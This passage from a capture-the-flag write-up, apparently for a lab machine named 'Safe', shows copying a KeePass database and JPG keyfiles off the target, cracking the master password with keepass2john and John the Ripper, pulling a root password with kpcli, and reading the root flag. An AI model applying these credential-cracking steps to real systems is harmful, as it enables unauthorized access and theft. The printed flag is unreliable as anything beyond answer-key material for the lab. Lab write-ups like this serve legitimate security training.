-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw------- 1 user user      33 May 13  2019 user.txt

user@safe:~$ 
{% endhighlight %}

Then download these files with scp command.
{% highlight shell %}
root@kali:~# scp 'user@10.10.10.147:~/*.JPG' .
Enter passphrase for key '/root/.ssh/id_rsa': 
IMG_0545.JPG                                                      100% 1863KB   4.6MB/s   00:00    
IMG_0546.JPG                                                      100% 1872KB  10.5MB/s   00:00    
IMG_0547.JPG                                                      100% 2470KB  10.2MB/s   00:00    
IMG_0548.JPG                                                      100% 2858KB  10.4MB/s   00:00    
IMG_0552.JPG                                                      100% 1099KB   9.1MB/s   00:00    
IMG_0553.JPG                                                      100% 1060KB   8.6MB/s   00:00    

root@kali:~# scp 'user@10.10.10.147:~/*.kdbx' .
Enter passphrase for key '/root/.ssh/id_rsa': 
MyPasswords.kdbx                                                  100% 2446    53.3KB/s   00:00    

root@kali:~# 
{% endhighlight %}

At first, we have to create the password hash of each JPG file with "keepass2john".
{% highlight shell %}
root@kali:~# for i in *.JPG
> do
> keepass2john -k $i MyPasswords.kdbx >>hashes
> done

root@kali:~# 
{% endhighlight %}

We can crack the hash with John the Ripper.<br>
The obtained password is "bullshit".
{% highlight shell %}
root@kali:~# john -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)

{% endhighlight %}

Now we found the password. Then, open the KeePass DB.<br>
We can find the key by trying each key.
{% highlight shell %}
root@kali:~# apt-get install kpcli

---

root@kali:~# kpcli --kdb MyPasswords.kdbx --key IMG_0547.JPG
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
MyPasswords/
kpcli:/> cd MyPasswords/
kpcli:/MyPasswords> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Root password
kpcli:/MyPasswords> show 0 -f

Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL:
Notes:

kpcli:/MyPasswords>
{% endhighlight %}

We can use the obtained password to be the root user.
{% highlight shell %}
user@safe:~$ su
Password: # u3v2249dl9ptv465cogl3cnpo3fyhk

root@safe:/home/user# id
uid=0(root) gid=0(root) groups=0(root)

root@safe:/home/user#
{% endhighlight %}

As always, "root.txt" is in the directory "/root"
{% highlight shell %}
root@safe:~# cat root.txt 
d7af235eb1db9fa059d2b99a6d1d5453

root@safe:~# 
{% endhighlight %}
